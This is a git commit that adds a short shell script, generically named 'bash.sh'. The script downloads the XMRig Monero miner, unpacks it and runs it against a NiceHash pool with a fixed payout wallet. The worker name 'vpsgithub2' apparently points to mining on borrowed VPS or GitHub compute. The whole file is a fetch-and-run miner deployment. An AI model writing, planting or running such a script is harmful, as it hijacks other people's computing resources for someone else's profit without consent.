0cc1c550948af56a27c56b2cd30bc8255b15b5e5
wandergame8 <91863383+wandergame8@users.noreply.github.com>
2021-10-04 11:14:27 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o randomxmonero.eu-north.nicehash.com:3380 -u 3HUBn5ZXsHqm2LrnsGNwdq4AsUypaLb4rn.vpsgithub2 -p 123 -k --nicehash -a rx/0
